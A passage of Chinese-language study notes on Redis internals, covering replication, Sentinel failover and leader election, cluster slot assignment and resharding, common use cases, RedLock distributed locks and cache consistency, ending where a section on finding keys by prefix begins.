- 服务器运行ID（run ID）

**复制偏移量**

执行复制的双方——主服务器和从服务器会分别维护一个复制偏移量：

- 主服务器每次向从服务器传播N个字节的数据时，就将自己的复制偏移量的值加上N
- 从服务器每次收到主服务器传播来的N个字节的数据时，就将自己的复制偏移量的值加N

通过对比复制偏移量，可以很容易的知道主从服务器是否处于一致状态。

**复制积压缓冲区**

复制积压缓冲区是由主服务器维护的一个**固定长度（fixed-size）先进先出（FIFO）**队列，默认大小为1MB。

当主服务器进行命令传播时，它不仅会将写命令发送给所有从服务器，还会将写命令入队到复制积压缓冲区里。

当从服务器重新连接到主服务器时，从服务区会通过PSYNC命令将自己的复制偏移量offset发送给主服务器，主服务器会根据这个偏移量来决定服务器进行何种同步操作：

- 如果offset还在缓冲区里面，执行部分重同步，否则完全重同步

复制积压缓冲区的大小可以用second*write_size_per_second来估算。

**服务器运行ID**

每个Redis服务器，不论是主服务器还是从服务器，都会有自己的运行ID

运行ID在服务器启动时自动生成，由40个随机的16进制字符组成。

从服务器对主服务器进行初次复制时，主服务器会将自己的运行ID发送给从服务器，从从服务器会将这个运行ID保存起来。

当从服务器断线并重新连接这个主服务器，从服务器将向当前连接的主服务器发送之前保存的运行ID；如果一致尝试执行部分重同步，如果不一致执行完整重同步操作。

#### PSYNC命令实现

如果从服务器从来没有复制过任何主服务器，或者之前执行过SLAVEOF no one命令，那么从服务器在开始一次新的复制时发送`PSYNC ? -1`命令，主动请求主服务器进行完整重同步。

![image-20200803142244142](..\assets\post\others\psync.png)

### 复制的实现

通过向从服务器发送`SLAVEOF`命令，可以让一个从服务器去复制一个主服务器：

`SLAVEOF <master_ip> <master_port>`

复制功能实现的主要步骤：

- 设置主服务器的地址和端口
  - 从服务器收到客户端的命令之后将IP和端口保存到服务器状态的`masterhost`和`masterport`属性里。
  - SLAVEOF是一个异步命令，设置完成服务器状态属性之后，从服务器返回OK，实际的复制工作之后完成
- 建立套接字连接：从服务器根据命令所设置的IP地址和端口创建连向主服务器的套接字连接。
  - 从服务器创建的套接字能成功连接（connect）到主服务器，那么从服务器将为这个套接字关联到一个专门用于处理复制工作的文件事件处理器，负责后续的复制工作。
  - 主服务器在接受（accept）从服务器的套接字连接之后，为该套接字创建相应的客户端状态，并将从服务器看作是一个连接到主服务器的客户端看待（**即从服务器是主服务器的客户端**）
- 发送PING命令：连接成功之后从服务器向主服务器发送一个PING命令

![image-20200803145247549](..\assets\post\others\copyping.png)

- 身份验证
  - 如果从服务器设置了`masterauth`选项，就进行身份验证；反之不进行身份验证
  - 在需要进行身份验证的情况下，从服务器向主服务器发送一条AUTH命令，命令的参数为从服务器`masterauth`选项的值

![image-20200803145722958](..\assets\post\others\copyauth.png)

- 发送端口信息
  - 身份验证之后，从服务器执行`REPLCONF listening-port <port-number>`，向主服务器发送从服务器的监听端口号。
  - 主服务器收到这个端口，将其设置在客户端状态中的`slave_listening_port`属性中
  - 目前该属性唯一的作用是在主服务器执行`INFO replication`命令时输出端口号
- 同步：从服务器向主服务器发送PSYNC命令，执行同步操作，并将自己的数据库更新至主服务器数据库当前所处的状态
  - 注意：在同步操作执行之前，只有从服务器是主服务器的客户端，但是在执行之后，主服务器也会变成从服务器的客户端
- 命令传播：主服务器只要一直系那个自己执行的写命令发送给从服务器，从服务器一直接收并执行写命令就可以实现同步了
  - 心跳检测：在命令传播阶段，从服务器默认每秒一次的频率向主服务器发送命令`REPLCONF ACK <replication_offset>`，参数为从服务器当前的偏移量，主要用来实现
    - 检测主从服务器的网络连接状态
    - 辅助实现min-slaves选项
    - 检测命令丢失

## Redis哨兵（Sentinel）

Sentinel（哨兵）是Redis的高可用性解决方案：有一个或者多个Sentinel实例组成的Sentinel系统可以监视任意多个主服务器，以及这些主服务器属下的所有从服务器，自动将下线主服务器属下的某个从服务器**升级为主服务器**，然后由新的主服务器代替下线的主服务器继续处理命令请求；并发送命令将余下的从服务器转转化为当前主服务器的从服务器。

当下线的主服务器重新上线之后，自动将其设置为当前主服务器的从服务器。

Sentinel本质就是一个运行在特殊模式下的Redis服务器。

###  	Redis sentinel（哨兵）模式优缺点有哪些？

Redis 哨兵的好处在于可以保证系统的高可用，各个节点可以对故障自动转移。但缺点是使用的主从模式，主节点单点风险高，主从切换过程可能会出现丢失数据的问题。

### 启动并初始化Sentinel

`redis-sentinel <conf file path>`

#### 初始化服务器

- Sentinel本质上就是一个运行在特殊模式下的Redis服务器，所以首先初始化一个普通的Redis服务器
- 但Sentinel的服务器与普通服务器并不相同

![image-20200803153109982](..\assets\post\others\sentinelfunc.png)

#### 使用sentinel专用代码

- 将一部分普通Redis服务器使用的代码替换成Sentinel专用代码。
  - 例如Sentinel使用的端口号为26379，普通服务器使用的是6379
  - Sentinel使用的命令表为`sentinel.c/sentinelcmds`，普通服务器使用的是`server.c/redisCommandTable`

#### 初始化Sentinel状态

服务器初始化一个`sentinel.c/sentinelState`结构（称为Sentinel状态），这个结构保存了服务器所有和Sentinel功能有关的状态。

```c
struct sentinelState{
	dict *masters;		// 字典的键是主服务器的名字，值是一个指向sentinelRedisInstance结构的指针
    ...
}sentinel;
```

#### 初始化Sentinel状态的masters属性

Sentinel状态中的masters字典记录了所有被Sentinel监视的主服务器的相关信息，其中：

- 字典的键是被监视主服务器的名字
- 字典的值是被监视主服务器对应的`sentinel.c/sentinelRedisInstance`结构，每个该结构代表一个被Sentinel监视的Redis服务器实例，这个实例可以是主服务器、从服务器，或者是另一个Sentinel

masters字典的初始化是根据Sentinel配置文件来进行的。

#### 创建连向主服务器的网络连接

初始化的最后一步是创建连向主服务器的网络连接，Sentinel将称为主服务器的客户端，可以向主服务器发送命令，并从命令回复中获取相关的信息。

对于每个被Sentinel监视的主服务器来说，Sentinel会创建两个连向主服务器的异步网络连接：

- 一个是命令连接，这个连接专门用于向主服务器发送命令，并接收命令回复
- 一个是订阅连接，专门用来订阅主服务器的`__sentinel__:hello`频道

### 获取主服务器信息

Sentinel默认以每10秒一次的频率，通过命令连接向被监视的主服务器发送INFO命令，并通过分析INFO命令的回复来获取主服务器的当前信息。信息中一部分是主服务器自身的信息；另一部分是主服务器属下所有的从服务器的信息。

```c
# Server
...
run_id:xxxxxxx(40位)
...
# Replication
role:master
...
slave0:ip=xxx,port=xxx,state=online,offset=xx,lag=0
slave1:ip=xxx,port=xxx,state=online,offset=xx,lag=0
...
# Other Sections
...
```

### 获取从服务器信息

当Sentinel发现主服务器有新的从服务器出现时，Sentinel除了会对这个新的从服务器进行相应的实例结构之外，Sentinel还会创建连接到这个从服务器的命令连接和订阅连接。

```
# Server
...
run_id:xxxxx
...
# Replication
role:slave
master_host:xxx
master_port:xxx
master_link_status:up	// 主从服务器连接状态
slave_repl_offset:xxx	// 从服务器复制偏移量
slave_priority:100		// 优先级
# Other Sections
...
```

### 向主从服务器发送信息

默认情况下，Sentinel会以每2秒一次的频率通过**命令连接**向所有被监视的服务器发送以下格式的命令：

`PUBLISH __sentinel__:hello "<s_ip>,<s_port>,<s_runid>,<s_epoch>,<m_name>,<m_ip>,<m_epoch>"`

其中s开头的信息为Sentinel本身的信息，m开头的信息为主服务器的信息。

### 接收来自主从服务器的频道信息

当Sentinel与一个主服务器或者从服务器建立起订阅连接之后，Sentinel就会通过**订阅连接**，向服务器发送以下命令：

`SUBSCRIBE __sentinel__:hello`

Sentinel对`__sentinel__:hello`频道的订阅会一直持续到Sentinel与服务器连接断开为止。也就是说，对于每个和sentinel连接的服务器，Sentinel既可以通过**命令连接**向服务器的`__sentinel__:hello`频道发送信息，也可以通过**订阅连接**从服务器的`__sentinel__:hello`频道接收信息。

对于同监视同一个服务器的多个Sentinel来说，一个Sentinel发送的信息会被其他Sentinel接收到，这些信息会被用于更新其他Sentinel对发送信息Sentinel的互相认知。

#### 更新sentinels字典

Sentinel为主服务器创建的实例结构中的sentinels字典保存了除Sentinel本身之外，其他监视该主服务器的Sentinel的资料。

- 键为其他Sentinel的名字，一般为IP:PORT
- 值为对应的Sentinel的实例结构

当一个Sentinel接收到其他Sentinel发来的信息时，目标Sentinel会从信息中分析并提取出一些参数：

- 与Sentinel有关的参数如源Sentinel的IP地址，端口号，运行ID和配置纪元
- 与主服务器有关的参数如源Sentinel正在监听的主服务器的名字，IP地址，端口号和配置纪元

根据提取出的主服务器参数，目标Sentinel会在自己的状态的masters字典中查找相应的主服务器实例结构，然后根据提取出的Sentinel参数检查主服务器实例结构中的sentinels字典，然后创建新实例结构或者更新实例。

### 检查主观下线状态

默认情况下，Sentinel以每秒一次的频率向与他创建了连接的所有实例发送PING命令，根据距上次有效返回的时间是否进入主观下线的时间长度判断主观下线状态，并打开该实例状态里的`flags`属性中的`SRI_S_DOWN`标识。

### 检查客观下线状态

当Sentinel将一个主服务器判断为主观下线后，为了确认这个主服务器是否真的下线，他会同样监视这个主服务器的其他Sentinel进行询问，当Sentinel从其他Sentinel那里接收到足够数量（启动时设置的参数）的已下线判断之后，Sentinel就会判定为客观下线，并进行故障转移操作。

`SENTINEL is-master-down-by-addr <ip> <port> <current_epoch> <runid>`

Sentinel收到该命令会对命令进行解析，并返回目标服务器的在线状态

### 选举领头Sentinel（Raft）

领头Sentinel用于对主服务器进行故障转移。

- Raft协议描述的节点共有三种状态：Leader, Follower, Candidate。

- 在系统运行正常的时候只有Leader和Follower两种状态的节点。一个Leader节点，其他的节点都是Follower。

- Candidate是系统运行不稳定时期的中间状态，当一个Follower对Leader的的心跳出现异常，就会转变成Candidate，Candidate会去竞选新的Leader，它会向其他节点发送竞选投票，如果大多数节点都投票给它，它就会替代原来的Leader，变成新的Leader，原来的Leader会降级成Follower。

#### Raft选举流程

- 增加自己的epoch
- 启动一个新的定时器（随机超时时间，随机选取配置时间的1到2倍之间。所以先成为candidate的更有机会成为leader）
- 给自己投一票
- 向所有节点发送RequestVote，并等待其他节点的回复。在这期间如果收到其他节点发送的AppendEntries就说明有leader产生了，自己转换为Follower，选举结束。
- 如果在计时器超时前，节点收到多数节点（N/2+1）的同意投票，就转换为Leader，同时向所有的其他节点发送AppendEntries，告知自己成为了leader。
- 如果所有candidate都没有拿到多数票，那么等计时器超时后重新成为candidate，重复选举流程。

#### Sentinel选举流程

当需要故障转移的时候会在sentinel集群中选举出一个leader执行故障转移操作。Sentinel使用了Raft协议实现Sentinel间选举leader的算法。Sentinel集群运行过程中故障转移完成，所有Sentinel又会恢复平等。Leader仅仅是故障转移时出现的角色。

- 某个Sentinel认定master客观下线后，会检查自己有没有投过票，如果已经投过，在2倍的故障转移超时时间内不会成为leader。
- 如果未投过票，就成为Candidate
- 以下进入Raft流程
  - 更新故障转移状态开始
  - 当前epoch+1，更新自己的超时时间未当前时间加1s内的随机毫秒数
  - 向其他节点发送`is-master-down-by-addr`命令请求选票，并带上自己的epoch
  - 给自己投一票，在sentinel中，**给自己投票的方式是把自己master结构体中的leader和leader_epoch改成投给的sentinel和它的epoch**
- 其他sentinel收到Candidate发送的`is-master-down-by-addr`命令，如果Sentinel当前epoch和Candidate传给他的epoch一样，说明它已经给别的candidate投过票，投过票的Sentinel在当前epoch内只能成为follower。
- Candidate会不断统计自己的票数，如果发现票数超过一半并且超过配置的quorum就成为Leader
- 如果在一个选举时间内，candidate没有获得一半且超过quorum的票数，则选举失败；等待超过2倍故障转移的超时时间后，重新开始选举流程。
- 与Raft不同，Leader不会把自己称为Leader的消息发给其他Sentinel。其他Sentinel等待leader选出master后，检测到新的master正常工作后，就会去掉客观下线的标志，从而不需要进入故障转移流程。

### 故障转移

#### 选出新的主服务器

- 在已下线主服务器属下的所有从服务器里，选择一个从服务器并将其设置为主服务器
  - 将所有从服务器保存在一个列表里，删除处于下线或者短线的，删除最近5秒内没有回复过领头Sentinel的INFO命令的，删除
- 让已下线主服务器属下的所有从服务器改为复制新的主服务器
- 将已下线主服务器设置为新的主服务器的从服务器，当旧主服务器重新上线后，会自动改变角色

选择完成后，领头Sentinel向被选中的从服务器发送`SLAVEOF no one`命令，之后以一秒一次的频率向被升级的从服务器发送INFO命令，观察命令回复的角色信息。

#### 修改从服务器的复制目标

向其他从服务器发送`SLAVEOF <ip> <port>`命令。

#### 将旧主服务器变为从服务器

在旧主服务器实例中的角色属性将其转换为从服务器，在它重新上线后，向他发送`SLAVEOF`命令。

## Redis集群(16384(2^14))

Redis集群是Redis提供的分布式数据库方案，集群通过分片（sharding）来进行数据共享，并提供复制和故障转移功能。

### 节点

一个Redis集群有多个**节点（node）**组成。使用`CLUSTER MEET`命令连接各个节点：

`CLUSTER MEET <ip> <port>`

向一个节点发送以上命令，可以让该节点同ip和port所指定的节点进行握手，握手成功之后，该节点就会将指定节点添加到该节点所在的集群中。

#### 启动节点

一个节点就是一个运行在集群模式下的Redis服务器，Redis服务器在启动时会根据`cluster-enabled`配置选项是否为yes来决定是否开启服务器的集群模式。

节点会继续使用所有在单机模式下使用的服务器组件，比如文件事件处理器，时间事件处理器，RDB和AOF持久化等。

其中serverCron函数会调用集群模式特有的clusterCron函数，该函数会执行在集群模式下需要执行的常规操作。比如向集群中的其他节点发送Gossip消息，检查节点是否断线等。

节点还使用`cluster.h/clusterNode,clusterLink,clusterState `结构保存集群模式状态。

#### 集群数据结构

每个节点都会使用一个clusterNode结构来保存自己的状态，比如节点创建时间，节点名字，节点IP地址和端口等，并为集群中的所有其他节点（包括主节点和从节点）都创建一个相应的clusterNode结构。

clusterNode结构中的link属性是一个clusterLink结构，该结构保存了连接节点所需要的有关信息，比如套接字描述符，输入输出缓冲区等。

clusterState结构记录了当前节点的视角下，集群目前所处的状态，比如集群是在线还是下线，集群包含了多少节点，集群目前的配置纪元等

#### CLUSTER MEET命令实现

通过向节点A发送`CLUSTER MEET <ip> <port>`命令，客户端可以让接收命令的节点A将另一个节点B添加到集群里

收到命令的节点A将与节点B进行握手，来确认彼此存在：

- 节点A为B创建一个`clusterNode`结构，并添加到自己的`clusterState.node`字典里
- 节点A根据命令给出的ip和port，向节点B发送一条MEET消息
- 节点B收到节点A发送的MEET消息，节点B会为节点A创建一个`clusterNode`结构，并添加到自己的集群节点字典中
- 之后节点B向A返回一条PONG消息
- A收到B发送的PONG消息，向B发送一条PING消息
- B收到A发送的PING消息，B知道A成功收到自己的PONG消息，握手完成

之后，节点A通过Gossip协议将节点B的信息传播给集群中的其他节点，让其他节点与节点B握手，经过一段时间，节点B会被集群中的所有节点认识。

### 槽指派

Redis集群通过分片的方式来保存数据库中的键值时：集群的整个数据库被分为16384(2^14)个槽（slot），数据库中的每个键都属于这16384个槽中的其中一个，集群中的每个节点可以处理0或者16384个槽。（因为传输节点数据时用到了位图存储，一次大约2K，心跳包适中）

当数据库中的16384个槽都有节点在处理时，集群处于上线状态（OK）；相反如果有任何一个或者多个没有节点处理，就处于下线状态（fail）。

通过`CLUSTER ADDSLOTS`命令，可以将一个或者多个槽指派给节点负责。

`clusterNode`结构中的`slots`和`numslot`属性记录了节点负责处理哪些槽。其中`slots`数组记录的二进制位信息，大小为16384/8。

节点除了会将自己负责的槽记录在属性中之外，海会将自己的`slots`数组通过消息发送给集群中的其他节点，以此来告诉其他节点自己目前负责处理哪些槽。其他节点根据这些信息更新保存的其他节点结构中的`slots`属性。

`clusterState`结构中的`slots`数组记录了每个槽的指派信息，大小为16384。

执行`CLUSTER ADDSLOTS`命令中，需要先检查所有输入槽是否都处于未指派状态，然后再对他们进行指派操作。

### 集群中执行命令

在对数据库的16384个节点进行指派之后，集群就处于上线状态，当客户端向节点发送与数据库键有关的命令时，接收命令的节点计算要处理的键属于哪个槽`CRC16(key)&16383`，并检查该槽是否指派给了自己：

- 如果该槽指派给了当前节点，那么该节点直接执行该命令
- 如果没有指派给当前节点，那么节点向客户端返回一个`MOVED`错误，指引客户端转向正确的节点，并向正确的节点再次发送命令。

节点和单机服务器在数据库方面的一个区别是：节点只能使用0号数据库，单机没有这个限制。

除了将键值对保存在数据库里之外，节点还会用`clusterState`结构中的`slots_to_keys`**rax树结构**保存槽和键之间的关系。

### 重新分片

Redis集群的重新分片操作可以将任意数量已经指派给某个节点的槽改为指派给另一个节点，并且相关槽所属的键值对也会转到另一个节点。

重新分片操作是通过Redis的集群管理软件`redis-trib`负责执行的，Redis提供了进行重新分片所需的所有指令，而`redis-trib`则通过向源节点和目标节点发送命令来进行重新分片操作。

主要步骤为：

- `redis-trib`对目标节点发送`CLUSTER SETSLOT <slot> IMPORTING <source_id>`命令，让目标节点准备好导入属于槽slot的键值对。
- `redis-trib`对源节点发送`CLUSTER SETSLOT <slot> MIGRATING <target_id>`命令，让源节点准备好迁移（migrating）slot键值对到目标节点。
- `redis-trib`对目标节点发送`CLUSTER GETKEYSINSLOT <slot> <count>`命令，获得最多count个属于槽slot的键值对的键名。
- 对于上个步骤获得的每个键名，`redis-trib`都向源节点发送`MIGRATE <target_ip> <target_port> <key_name> 0 <timeout>`，将被选中的键原子的从源节点迁移到目标节点。
- 重复执行上述步骤，直到所有键值对迁移完成。
- `redis-trib`向集群中任意一个节点发送`CLUSTER SETSLOT <slot> NODE <target_id>`命令，将槽id指派给目标节点，最终整个集群都会知道。

#### ASK错误

在重新分片过程中，可能存在部分键值对保存在源节点中，另一部分在目标节点。此时仓客户端发送一个与数据库键有关的命令，并且命令要处理的数据库键恰好属于正在被迁移的槽（保存在`clusterNOde *migrating_slots_to[16384]`中）时：

- 源节点首先在自己数据库中查找指定的键，如果找到就返回给客户端
- 如果没有找到，那么这个键有可能被迁移到了目标节点中，源节点向客户端返回一个ASK错误，指引客户端转向目标节点查找。

#### ASK错误和MOVED错误的区别

两者都会导致客户端转向

- MOVED错误标识槽的负责权已经从一个节点转移到另一个节点，永久性重定向
- ASK错误是迁移槽过程中使用的一种临时措施，客户端收到该错误之后，会在下一次命令请求中将其发送到该错误所指定的节点上，之后还是发到当前节点上

### 复制和故障转移

Redis集群中由多个节点组成，主节点负责进行处理槽，每个主节点还可以有多个从节点，用于复制主节点，达到高可用的目的。

当发生主节点掉线后，集群自动从该主节点的从节点中选择一个作为主节点处理相应的槽。

- 设置从节点
  - 向一个节点发送`CLUSTER REPLICATE <node_id>`将其变为指定节点的从节点，并对其进行复制
  - 接收到该命令的节点首先在自己的`clusterState.nodes`字典中找到`node_id`所对应节点的`clusterNode`结构，并将自己的`clusterState.myself.slaveof`指针指向这个结构，以此来记录这个节点正在复制的主节点。
  - 修改`clusterState.myself.flags`中的属性，关闭`REIDS_NODE_MASTER`，打开`REDIS_NODE_SLAVE`，表示该节点已经变为从节点
  - 最后，节点调用复制代码，根据第二步保存的主节点信息对齐进行复制，相当于向从节点发送命令`SLAVEOF <master_ip> <master_port>`
  - 当一个节点成为从节点并开始复制某个主节点后，这一信息会发送给集群内所有节点，集群中的所有节点更新该主节点结构体（`nodes值`）中的`slaves`和`numslaves`属性。
- 故障检测
  - 集群中的每个节点都会定期向集群中的其他节点发送PING消息，以此来检测对象是否在线，如果接收PING消息的节点在规定时间内没有返回PONG消息，将其标记为疑似下线。
  - 集群中的各个节点还会通过互相发送消息的方式来交换集群中各个节点的状态信息，比如`ONLINE, PFAIL, FAIL`
  - 所有收到某主节点疑似下线信息的节点将该信息保存到某节点结构体中的`fail_reports`链表中。
  - 如果一个集群里面半数负责处理槽的主节点都将某个主节点x报告为疑似下线，那么这个主节点x就会被标记为下线，同时将该信息广播给集群内其他节点，其他收到该信息的节点立即将主节点x标记为下线。
- 故障转移
  - 当一个从节点发现自己正在复制的主节点进入了下线状态，从节点开始对下线主节点进行故障转移：
    - 选中一个从节点执行`SLAVEOF no one`，成为新的主节点
    - 新的主节点会撤销所有对已下线主节点的槽指派，并将槽全部分配给自己
    - 新的主节点向集群广播一条PONG消息，让其他节点知道该节点已转变为主节点
    - 该新主节点开始处理命令请求。

### 消息

集群中的各个节点通过发送和接收消息（message）来进行通信，消息由消息头和消息体组成，消息主要包括以下5种：

- `MEET`消息：连接节点，使节点加入到集群中
- `PING`消息：每1秒钟随机从已知节点列表中选出5个，对这5个节点最长没有发送过PING消息的节点发送PING消息，检测被选中阶段是否在线；除此之外，如果节点A最后一次收到节点B发送的PONG消息的时间，距离当前时间已经超过了节点A的`cluster-node-timeout`选项设置时长的一半，那么节点A也会向节点B发送PING消息。
- `PONG`消息：收到PING消息后返回PONG消息；另外，一个节点也可以通过广播自己的PONG消息来让集群中的其他节点立即刷新关于该节点的认知
- `FAIL`消息：当一个主节点A判断另一个节点B进入FAIL状态，节点A向集群广播一条关于B的FAIL消息
- `PUBLISH`消息：当节点收到一个PUBLISH命令，节点会执行这个命令，并向集群广播一条PUBLISH消息，所有收到这条消息的节点都执行相同的PUBLISH命令。

### Redis 集群会有写操作丢失吗？为什么？

Redis 集群中有可能存在写操作丢失的问题，但是丢失概率一般可以忽略不计。主要是 Redis 并没有一个机制保证数据一定写不丢失。在以下问题中可能出现键值丢失的问题：

**1. 超过内存的最大值，键值被清理**

Redis 中可以设置缓存的最大内存值，当内存中的数据总量大于设置的最大内存值，会导致 Redis 对部分数据进行清理，导致键值丢失的问题。

**2. 大量的 key 过期，被清理**

这种情况比较正常，只是因为键值设置的时间过期了，被自动清理了。

**3. Redis 主库服务器故障重启**

由于 Redis 的数据是缓存在内存中的，如果 Redis 主库服务器出现故障重启，会出现数据被清空的问题。这时可能导致从库的数据同步被清空。如果有使用数据持久化，那么故障重启后数据是可以自动恢复的。

**4. 网络问题**

可能出现网络故障，导致短时间内数据写入失败。

### Redis 集群方案应该怎么做，有哪些方案？

Redis 可以使用的集群方法有：

- Redis cluster 3.0：这是 Redis 自带的集群功能，它采用的分布式算法是哈希槽，而不是一致性 hash。支持主从结构，可以扩展多个从服务器，当主节点挂了可以很快的切换到一个从节点做主节点，然后从节点都读取到新的主节点。
- Twemproxy，它是 Twitter 开源的一个轻量级后端代理，可以管理 Redis 或 Memcache 集群。它相对于 Redis 集群来说，易于管理。它的使用方法和 Redis 集群没有任何区别，只需要设置好多个 Redis 实例后，在本需要连接 redis 的地方改为连接 Twemproxy，它会以一个代理的身份接收请求并使用一致性 hash 算法，将请求转接到具体 Redis 节点，将结果再返回 Twemproxy。对于客户端来说，Twemproxy 相当于是缓存数据库的入口，它不需要知道后端如何部署的。Twemproxy 会检测与每个节点的连接是否正常，如果存在异常节点，则会被剔除，等一段时间后，Twemproxy 还会再次尝试连接被剔除的节点。
- Codis，它是一个 Redis 分布式的解决方式，对于应用使用 Codis Proxy 的连接和使用 Redis 服务的没有明显差别，应用能够像使用单机 Redis 一样，让 Codis 底层处理请求转发，不停机的数据迁移等工作。

## Redis使用场景

### 计数器

可以对string进行自增自减运算，从而实现计数器的功能。

Redis这种内存型数据库的读写性能非常高，很适合存储频繁读写的计数量。

### 缓存

将热点数据放在内存中，设置内存的最大使用量以及淘汰缓存策略来保证缓存的命中率。

### 查找表

查找表和缓存类似，也是利用了redis快速的查找特性。但是查找表的内容不能失效，而缓存的内容可以失效，因为缓存不作为可靠的数据来源。

例如DNS记录就很适合使用redis进行存储。

### 消息队列

List是一个双向链表，可以通过LPUSH和RPOP写入和读取信息。

不过最好使用rabbitmq等消息中间件。

一般使用list结构作为队列，rpush生产消息，lpop消费消息。当lpop没有消息的时候，要适当sleep一会再重试。

**如果对方追问可不可以不用sleep呢？**list还有个指令叫blpop，在没有消息的时候，它会阻塞住直到消息到来。

**如果对方追问能不能生产一次消费多次呢？**使用pub/sub主题订阅者模式，可以实现1:N的消息队列。

**如果对方追问pub/sub有什么缺点？**在消费者下线的情况下，生产的消息会丢失，得使用专业的消息队列如rabbitmq等。

**如果对方追问redis如何实现延时队列？**我估计现在你很想把面试官一棒打死如果你手上有一根棒球棍的话，怎么问的这么详细。但是你很克制，然后神态自若的回答道：使用sortedset，拿时间戳作为score，消息内容作为key调用zadd来生产消息，消费者用zrangebyscore指令获取N秒之前的数据轮询进行处理。

### 会话缓存

可以使用redis来统一存储多台应用服务器的会话信息。

当应用服务器不再存储用户的会话信息，也就不再具有状态，一个用户可以请求任意一个应用服务器，从而更容易实现高可用性以及可伸缩性。

### 分布式锁实现

在分布式场景下，无法使用单机环境的锁来对多个节点上的进程进行同步。

可以使用redis自带的SETNX命令实现分布式锁，除此之外，还可以使用官方提供的redlock分布式锁来实现。

#### 分布式锁的缺陷

一、客户端长时间阻塞导致锁失效问题

客户端1得到了锁，因为网络问题或者GC等原因导致长时间阻塞，然后业务程序还没执行完锁就过期了，这时候客户端2也能正常拿到锁，可能会导致线程安全的问题。

![img](https://segmentfault.com/img/remote/1460000038988089)

客户端长时间阻塞

**解决方案：**

**使用 Redisson 的分布式锁**：

可以利用锁的可重入特性，让获得锁的线程开启一个定时器的守护线程，每 expireTime/3 执行一次，去检查该线程的锁是否存在，如果存在则对锁的过期时间重新设置为 expireTime，即利用守护线程对锁进行“续命”，防止锁由于过期提前释放。

二、redis服务器时钟漂移问题

如果redis服务器的机器时钟发生了向前跳跃，就会导致这个key过早超时失效，比如说客户端1拿到锁后，key的过期时间是12:02分，但redis服务器本身的时钟比客户端快了2分钟，导致key在12:00的时候就失效了，这时候，如果客户端1还没有释放锁的话，就可能导致多个客户端同时持有同一把锁的问题。

三、单点实例安全问题

如果redis是单master模式的，当这台机宕机的时候，那么所有的客户端都获取不到锁了，为了提高可用性，可能就会给这个master加一个slave，但是因为redis的主从同步是异步进行的，可能会出现客户端1设置完锁后，master挂掉，slave提升为master，因为异步复制的特性，客户端1设置的锁丢失了，这时候客户端2设置锁也能够成功，导致客户端1和客户端2同时拥有锁。

为了解决Redis单点问题，redis的作者提出了**RedLock**算法。

**RedLock算法**

该算法的实现前提在于Redis必须是多节点部署的，可以有效防止单点故障，具体的实现思路是这样的：

1、获取当前时间戳（ms）；

2、先设定key的有效时长（TTL），超出这个时间就会自动释放，然后client（客户端）尝试使用相同的key和value对所有redis实例进行设置，每次链接redis实例时设置一个比TTL短很多的超时时间，这是为了不要过长时间等待已经关闭的redis服务。并且试着获取下一个redis实例。

比如：TTL（也就是过期时间）为5s，那获取锁的超时时间就可以设置成50ms，所以如果50ms内无法获取锁，就放弃获取这个锁，从而尝试获取下个锁；

3、client通过获取所有能获取的锁后的时间减去第一步的时间，还有redis服务器的时钟漂移误差，然后这个时间差要小于TTL时间并且成功设置锁的实例数>= N/2 + 1（N为Redis实例的数量），那么加锁成功

比如TTL是5s，连接redis获取所有锁用了2s，然后再减去时钟漂移（假设误差是1s左右），那么锁的真正有效时长就只有2s了；

4、如果客户端由于某些原因获取锁失败，便会开始解锁所有redis实例。

根据这样的算法，我们假设有5个Redis实例的话，那么client只要获取其中3台以上的锁就算是成功了，用流程图演示大概就像这样： 

![img](https://segmentfault.com/img/remote/1460000038988093)

key有效时长

好了，算法也介绍完了，从设计上看，毫无疑问，RedLock算法的思想主要是为了有效防止Redis单点故障的问题，而且在设计TTL的时候也考虑到了服务器时钟漂移的误差，让分布式锁的安全性提高了不少。

但事实真的是这样吗？反正我个人的话感觉效果一般般，

首先第一点，我们可以看到，在RedLock算法中，锁的有效时间会减去连接Redis实例的时长，如果这个过程因为网络问题导致耗时太长的话，那么最终留给锁的有效时长就会大大减少，客户端访问共享资源的时间很短，很可能程序处理的过程中锁就到期了。而且，锁的有效时间还需要减去服务器的时钟漂移，但是应该减多少合适呢，要是这个值设置不好，很容易出现问题。

然后第二点，这样的算法虽然考虑到用多节点来防止Redis单点故障的问题，但但如果有节点发生崩溃重启的话，还是有可能出现多个客户端同时获取锁的情况。

假设一共有5个Redis节点：A、B、C、D、E，客户端1和2分别加锁

1. 客户端1成功锁住了A，B，C，获取锁成功（但D和E没有锁住）。
2. 节点C的master挂了，然后锁还没同步到slave，slave升级为master后丢失了客户端1加的锁。
3. 客户端2这个时候获取锁，锁住了C，D，E，获取锁成功。

为了避免 Redis 节点发生崩溃重启后造成锁丢失，从而影响锁的安全性，antirez 还提出了延时重启的概念，即一个节点崩溃后不要立即重启，而是等待一段时间后再进行重启，这段时间应该大于锁的有效时间。

### 其他

Set可以实现交集、并集等操作，从而实现共同好友等功能。

ZSet可以实现有序性操作，从而实现排行榜等功能。

### 缓存常见问题

#### 缓存更新方式

缓存的数据在数据源发生变更时需要对缓存进行更新，数据源可能是 DB，也可能是远程服务。更新的方式可以是主动更新。数据源是 DB 时，可以在更新完 DB 后就直接更新缓存。

当数据源不是 DB 而是其他远程服务，可能无法及时主动感知数据变更，这种情况下一般会选择对缓存数据设置失效期，也就是数据不一致的最大容忍时间。

这种场景下，可以选择失效更新，key 不存在或失效时先请求数据源获取最新数据，然后再次缓存，并更新失效期。

但这样做有个问题，如果依赖的远程服务在更新时出现异常，则会导致数据不可用。改进的办法是异步更新，就是当失效时先不清除数据，继续使用旧的数据，然后由异步线程去执行更新任务。这样就避免了失效瞬间的空窗期。另外还有一种纯异步更新方式，定时对数据进行分批更新。实际使用时可以根据业务场景选择更新方式。

#### 数据不一致

第二个问题是数据不一致的问题，可以说只要使用缓存，就要考虑如何面对这个问题。缓存不一致产生的原因一般是主动更新失败，例如更新 DB 后，更新 **Redis** 因为网络原因请求超时；或者是异步更新失败导致。

解决的办法是，如果服务对耗时不是特别敏感可以增加重试；如果服务对耗时敏感可以通过异步补偿任务来处理失败的更新，或者短期的数据不一致不会影响业务，那么只要下次更新时可以成功，能保证最终一致性就可以。

#### 多机redis如何保证数据一致性

主从复制，读写分离

一类是主数据库（master）一类是从数据库（slave），主数据库可以进行读写操作，当发生写操作的时候自动将数据同步到从数据库，而从数据库一般是只读的，并接收主数据库同步过来的数据，一个主数据库可以有多个从数据库，而一个从数据库只能有一个主数据库。

#### 海量Redis数据

**假如Redis里面有1亿个key，其中有10w个key是以某个固定的已知的前缀开头的，如果将它们全部找出来？**

我们可以使用 keys 命令和 scan 命令，但是会发现使用 scan 更好。

**1. 使用 keys 命令**

